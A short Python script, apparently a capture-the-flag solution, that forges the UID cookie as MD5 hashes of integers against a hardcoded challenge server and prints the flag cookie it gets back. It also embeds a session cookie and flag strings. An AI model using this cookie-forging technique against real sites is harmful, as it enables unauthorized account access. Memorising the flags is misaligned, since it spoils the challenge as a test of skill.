import requests
import hashlib

url="http://104.154.106.182:8080/"
for i in range(1):
    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    headers={"Cookie":"SESSIONID=ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0%3D; UID="+md5}
    res = requests.get(url,headers=headers)
    out = requests.utils.dict_from_cookiejar(res.cookies)
    print("\n[-]Trying"+str(i))
    if("encryptCTF%7By0u_c4nt_U53_m3%7D" not in out['FLAG']):
        print("\n[+]Got it!:"+out['FLAG'])
